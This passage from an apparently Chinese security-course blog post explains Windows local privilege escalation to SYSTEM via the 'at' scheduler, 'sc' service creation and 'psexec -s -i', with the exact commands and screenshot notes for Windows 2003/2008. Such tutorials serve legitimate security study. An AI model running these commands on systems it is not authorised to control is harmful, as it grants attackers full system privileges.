+<p>1、AT提权</p>
+<p>相关命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">at 21:26 /interactive cmd.exe //给系统添加一项作业，在21:26打开cmd命令</span><br><span class="line">at  //查看作业详情</span><br><span class="line">at /del //删除作业</span><br></pre></td></tr></table></figure>
+
+<p>只针对win7之前的老系统，下面我们在windows2003系统上测试</p>
+<p>&lt;1&gt;使用at命令给系统添加一项作业，在特定时间打开cmd命令</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59-23.png" alt="59-23"></p>
+<p>&lt;2&gt;等到特定时间时，系统会弹出cmd窗口，运行whoami，发现已经取得了system权限，提权成功。</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59-24.png" alt="59-24"></p>
+<p>这是windows2003系统设计上的一个逻辑错误，就是计划任务在运行时会以system身份调用执行。所以弹出来的cmd窗口界面就会享有system权限。</p>
+<p>2、SC提权</p>
+<p>相关命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc Create syscmd binPath = &quot;cmd /k start&quot; type= own type= interact</span><br><span class="line">sc start syscmd</span><br></pre></td></tr></table></figure>
+
+<p>网上说，可以针对win7&#x2F;2k8，但是实操时并没成功。下面我们在windows2003系统上测试</p>
+<p>&lt;1&gt;首先whoami查看用户身份为管理员</p>
+<p>&lt;2&gt;使用sc命令创建一个服务，启动这个服务</p>
+<p>&lt;3&gt;弹出cmd窗口，运行whoami，发现已经取得了system权限，提权成功。</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59-25.png" alt="59-25"></p>
+<p>3、PS提权</p>
+<p>pstools是微软官方工具，是为windows提供的第三方工具库</p>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools">https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools</a></p>
+<p>相关命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe -accepteula -s -i -d cmd.exe</span><br></pre></td></tr></table></figure>
+
+<p>windows2008系统测试</p>
+<p>&lt;1&gt;执行PS命令会弹出一个新的cmd窗口</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59-26.png" alt="59-26"></p>
+<p>&lt;2&gt;运行whoami，发现已经取得了system权限，提权成功。</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59-27.png" alt="59-27"></p>
+<p>案例给到的思路总结如下：</p>
+<p>1.提权方法有部分适用在不同环境，当然也有通用方法<br>2.提权方法也有操作系统版本区别，特性决定方法利用面<br>3.提权方法有部分需要特定环境，如数据库，第三方提权等</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://blog.hvvl404.fun/">HVVL404</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://blog.hvvl404.fun/2023/06/05/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%8F%8AAT&amp;SC&amp;PS%E6%8F%90%E6%9D%83/">http://blog.hvvl404.fun/2023/06/05/小迪安全/小迪安全（权限提升）/59：权限提升-Win溢出漏洞及AT&amp;SC&amp;PS提权/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://blog.hvvl404.fun" target="_blank">HVVL404</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/images/avatar.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2023/06/05/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-MY&amp;MS&amp;ORA%E7%AD%89SQL%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/" title="60：权限提升-MY&amp;MS&amp;ORA等SQL数据库提权"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">60：权限提升-MY&amp;MS&amp;ORA等SQL数据库提权</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/images/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">HVVL404</div><div class="author-info__description">欢迎来到我的博客</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">60</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/06/05/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%8F%8AAT&amp;SC&amp;PS%E6%8F%90%E6%9D%83/" title="59：权限提升-Win溢出漏洞及AT&amp;SC&amp;PS提权">59：权限提升-Win溢出漏洞及AT&amp;SC&amp;PS提权</a><time datetime="2023-06-05T14:47:18.052Z" title="发表于 2023-06-05 22:47:18">2023-06-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/06/05/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-MY&amp;MS&amp;ORA%E7%AD%89SQL%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/" title="60：权限提升-MY&amp;MS&amp;ORA等SQL数据库提权">60：权限提升-MY&amp;MS&amp;ORA等SQL数据库提权</a><time datetime="2023-06-05T14:37:01.209Z" title="发表于 2023-06-05 22:37:01">2023-06-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/06/05/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/58%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E6%9D%83%E9%99%90%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96/" title="58：权限提升-网站权限后台漏洞第三方获取">58：权限提升-网站权限后台漏洞第三方获取</a><time datetime="2023-06-05T14:27:20.000Z" title="发表于 2023-06-05 22:27:20">2023-06-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/05/26/Web%E6%BC%8F%E6%B4%9E/JWT%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E6%BC%8F%E6%B4%9E/" title="无题">无题</a><time datetime="2023-05-26T14:25:56.752Z" title="发表于 2023-05-26 22:25:56">2023-05-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/05/26/Web%E6%BC%8F%E6%B4%9E/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="无题">无题</a><time datetime="2023-05-26T14:16:40.565Z" title="发表于 2023-05-26 22:16:40">2023-05-26</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023.4.27 - 2023 By HVVL404</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi, welcome to my <a href="http://blog.hvvl404.fun">blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
